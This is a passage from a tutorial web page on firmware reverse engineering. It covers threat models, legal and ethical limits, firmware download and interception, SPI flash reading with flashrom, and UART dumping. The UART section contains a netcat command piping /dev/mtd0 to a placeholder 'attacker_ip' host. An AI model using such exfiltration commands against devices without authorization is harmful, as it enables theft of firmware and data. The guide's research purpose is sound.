<li class="">Enable third-party firmware (OpenWrt, DD-WRT)</li>
</ul>
<p><strong>Forensics:</strong></p>
<ul>
<li class="">Recover deleted data from devices</li>
<li class="">Analyze malware on IoT devices</li>
<li class="">Incident response for compromised embedded systems</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="threat-model">Threat Model<a href="#threat-model" class="hash-link" aria-label="Direct link to Threat Model" title="Direct link to Threat Model" translate="no">​</a></h3>
<p><strong>Attacker capabilities:</strong></p>
<ul>
<li class=""><strong>Remote attacker:</strong> Network access only (web interface, network services)</li>
<li class=""><strong>Local network attacker:</strong> LAN access (MITM, spoofing)</li>
<li class=""><strong>Physical access:</strong> UART/JTAG debugging, firmware extraction, hardware modification</li>
<li class=""><strong>Insider threat:</strong> Supply chain attacks, malicious firmware updates</li>
</ul>
<p><strong>Common attack vectors:</strong></p>
<ul>
<li class="">Unauthenticated web interfaces</li>
<li class="">Default/hardcoded credentials</li>
<li class="">Command injection in web parameters</li>
<li class="">Buffer overflows in network services</li>
<li class="">Insecure firmware update mechanisms</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="legal--ethical-considerations">Legal &amp; Ethical Considerations<a href="#legal--ethical-considerations" class="hash-link" aria-label="Direct link to Legal &amp; Ethical Considerations" title="Direct link to Legal &amp; Ethical Considerations" translate="no">​</a></h3>
<p><strong>Legal risks:</strong></p>
<ul>
<li class=""><strong>DMCA Section 1201 (US):</strong> Prohibits circumventing access controls (encryption, code signing)</li>
<li class=""><strong>CFAA:</strong> Unauthorized access to computer systems</li>
<li class=""><strong>Warranty void:</strong> Hardware modification may void warranties</li>
<li class=""><strong>Responsible disclosure:</strong> Report vulnerabilities to vendors before public disclosure</li>
</ul>
<p><strong>Ethical guidelines:</strong></p>
<ul>
<li class="">✅ Security research on devices you own</li>
<li class="">✅ Responsible vulnerability disclosure (CVE, vendor coordination)</li>
<li class="">✅ Improving device security (custom firmware, patches)</li>
<li class="">❌ Attacking devices you don&#x27;t own without authorization</li>
<li class="">❌ Weaponizing vulnerabilities for malicious purposes</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="firmware-acquisition">Firmware Acquisition<a href="#firmware-acquisition" class="hash-link" aria-label="Direct link to Firmware Acquisition" title="Direct link to Firmware Acquisition" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="method-1-download-from-vendor-website">Method 1: Download from Vendor Website<a href="#method-1-download-from-vendor-website" class="hash-link" aria-label="Direct link to Method 1: Download from Vendor Website" title="Direct link to Method 1: Download from Vendor Website" translate="no">​</a></h3>
<p><strong>Easiest method</strong> - many vendors provide firmware updates for download.</p>
<p><strong>Finding firmware:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Google search:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">site:vendor.com </span><span class="token string" style="color:#e3116c">&quot;firmware update&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;download&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example (TP-Link router):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># https://www.tp-link.com/us/support/download/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Download firmware:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://static.tp-link.com/</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Verify hash (if vendor provides):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sha256sum firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Compare with vendor-provided SHA-256 hash</span><br></span></code></pre></div></div>
<p><strong>Firmware update file types:</strong></p>
<ul>
<li class=""><code>.bin</code> - Raw binary image</li>
<li class=""><code>.img</code> - Disk image</li>
<li class=""><code>.zip</code> / <code>.tar.gz</code> - Compressed archive</li>
<li class=""><code>.trx</code> - TRX firmware format (Broadcom routers)</li>
<li class=""><code>.chk</code> - Netgear firmware format</li>
<li class="">Vendor-specific formats (encrypted or obfuscated)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="method-2-intercept-firmware-update">Method 2: Intercept Firmware Update<a href="#method-2-intercept-firmware-update" class="hash-link" aria-label="Direct link to Method 2: Intercept Firmware Update" title="Direct link to Method 2: Intercept Firmware Update" translate="no">​</a></h3>
<p><strong>If vendor doesn&#x27;t provide direct download</strong>, intercept update traffic.</p>
<p><strong>Setup:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Wireshark capture during firmware update:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1. Start Wireshark on network interface</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Filter: http or dns</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Trigger firmware update from device web interface</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 4. Look for HTTP GET/POST to download URL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example captured URL:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># http://update.vendor.com/firmware/device_v1.2.3.bin</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Download:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> http://update.vendor.com/firmware/device_v1.2.3.bin</span><br></span></code></pre></div></div>
<p><strong>HTTPS interception (if update is encrypted):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Use Burp Suite or mitmproxy as HTTPS proxy:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1. Configure device to use proxy (if possible)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Install proxy CA certificate on device (if possible)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Capture firmware download URL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># If device validates certificate (common), this won&#x27;t work</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Fall back to hardware extraction</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="method-3-extract-from-flash-memory-hardware">Method 3: Extract from Flash Memory (Hardware)<a href="#method-3-extract-from-flash-memory-hardware" class="hash-link" aria-label="Direct link to Method 3: Extract from Flash Memory (Hardware)" title="Direct link to Method 3: Extract from Flash Memory (Hardware)" translate="no">​</a></h3>
<p><strong>Required when:</strong></p>
<ul>
<li class="">Vendor doesn&#x27;t provide firmware</li>
<li class="">Firmware is encrypted during updates</li>
<li class="">Need to analyze modified/infected firmware</li>
</ul>
<p><strong>Hardware required:</strong></p>
<ul>
<li class=""><strong>Flash programmer:</strong> Bus Pirate, CH341A USB programmer, Raspberry Pi</li>
<li class=""><strong>Chip clip or soldering iron:</strong> To connect to flash chip</li>
<li class=""><strong>Multimeter:</strong> To identify voltage levels</li>
</ul>
<p><strong>Common flash memory types:</strong></p>
<table><thead><tr><th>Type</th><th>Interface</th><th>Capacity</th><th>Common Use</th></tr></thead><tbody><tr><td><strong>SPI Flash (25-series)</strong></td><td>SPI (4-8 pins)</td><td>1-128 MB</td><td>Routers, IoT</td></tr><tr><td><strong>NAND Flash</strong></td><td>Parallel</td><td>128 MB - 32 GB</td><td>Smartphones, tablets</td></tr><tr><td><strong>eMMC</strong></td><td>MMC interface</td><td>4-256 GB</td><td>Android devices, embedded Linux</td></tr><tr><td><strong>I2C EEPROM (24-series)</strong></td><td>I2C (2 pins)</td><td>1-512 KB</td><td>Small devices, config storage</td></tr></tbody></table>
<p><strong>Extracting SPI flash (most common):</strong></p>
<p><strong>Step 1: Identify flash chip</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Open device, locate flash chip on PCB</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common SPI flash chips: Winbond W25Q64, Macronix MX25L, Spansion S25FL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example chip markings:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Winbold</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 25Q64FVSIG</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1234567890  (date code)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Datasheet: Google &quot;W25Q64 datasheet&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pinout (SOIC-8):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 1: /CS (Chip Select)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 2: DO (Data Out / MISO)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 3: /WP (Write Protect)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 4: GND</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 5: DI (Data In / MOSI)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 6: CLK (Clock)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 7: /HOLD</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 8: VCC (3.3V)</span><br></span></code></pre></div></div>
<p><strong>Step 2: Connect flash programmer</strong></p>
<p><strong>Using CH341A USB programmer:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># CH341A wiring to SPI flash (SOIC-8):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># CH341A    | SPI Flash Pin | Function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># --------- | ------------- | --------</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># VCC (3.3V)| Pin 8         | Power</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># GND       | Pin 4         | Ground</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># CS        | Pin 1         | Chip Select</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># MISO      | Pin 2         | Data Out</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># MOSI      | Pin 5         | Data In</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># CLK       | Pin 6         | Clock</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Option 1: Use chip clip (no soldering)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Attach SOIC-8 clip to chip while on PCB</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Option 2: Desolder chip (more reliable)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use hot air station or soldering iron</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Place chip in ZIF socket on CH341A programmer</span><br></span></code></pre></div></div>
<p><strong>Step 3: Read flash memory</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Linux: Install flashrom</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> flashrom</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Detect flash chip:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> flashrom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> ch341a_spi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Found Winbond flash chip &quot;W25Q64.V&quot; (8192 kB, SPI) on ch341a_spi.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Read flash (3 times to verify integrity):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> flashrom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> ch341a_spi </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> firmware1.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> flashrom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> ch341a_spi </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> firmware2.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> flashrom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> ch341a_spi </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> firmware3.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Verify all reads are identical (compare hashes):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sha256sum firmware*.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># All three should have same hash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use firmware1.bin for analysis</span><br></span></code></pre></div></div>
<p><strong>Using Raspberry Pi as SPI programmer:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Enable SPI on Raspberry Pi:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> raspi-config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Interfacing Options → SPI → Enable</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Wiring (Raspberry Pi GPIO to SPI flash):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># RPi GPIO  | SPI Flash Pin | Function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># --------- | ------------- | --------</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 1 (3.3V) | Pin 8      | Power</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 6 (GND)  | Pin 4      | Ground</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 24 (CE0) | Pin 1      | Chip Select</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 21 (MISO)| Pin 2      | Data Out</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 19 (MOSI)| Pin 5      | Data In</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin 23 (SCLK)| Pin 6      | Clock</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Read flash:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> flashrom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> linux_spi:dev</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/dev/spidev0.0,spispeed</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1000</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> firmware.bin</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="method-4-uartserial-console-extraction">Method 4: UART/Serial Console Extraction<a href="#method-4-uartserial-console-extraction" class="hash-link" aria-label="Direct link to Method 4: UART/Serial Console Extraction" title="Direct link to Method 4: UART/Serial Console Extraction" translate="no">​</a></h3>
<p><strong>If device has UART debug console</strong>, you may be able to dump firmware.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Connect to UART (see Hardware Interfaces section)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common UART commands (BusyBox/Linux):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Dump entire flash partition:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/dev/mtd0 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">lt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">attacker_ip</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">gt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># On attacker machine:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or use base64 encoding (if binary transfer fails):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/dev/mtd0 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Copy output, decode on attacker machine:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">base64 </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> firmware.bin</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="firmware-analysis">Firmware Analysis<a href="#firmware-analysis" class="hash-link" aria-label="Direct link to Firmware Analysis" title="Direct link to Firmware Analysis" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="initial-triage">Initial Triage<a href="#initial-triage" class="hash-link" aria-label="Direct link to Initial Triage" title="Direct link to Initial Triage" translate="no">​</a></h3>
<p><strong>Determine firmware type and architecture:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># File type detection:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output examples:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - &quot;data&quot; (raw binary, compressed, or encrypted)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - &quot;ELF 32-bit LSB executable, ARM&quot; (Linux kernel or application)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - &quot;gzip compressed data&quot; (compressed filesystem)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - &quot;Squashfs filesystem&quot; (embedded filesystem)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Binwalk: Identify embedded files/filesystems</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">binwalk firmware.bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># DECIMAL       HEXADECIMAL     DESCRIPTION</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># --------------------------------------------------------------------------------</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 0             0x0             TRX firmware header</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span 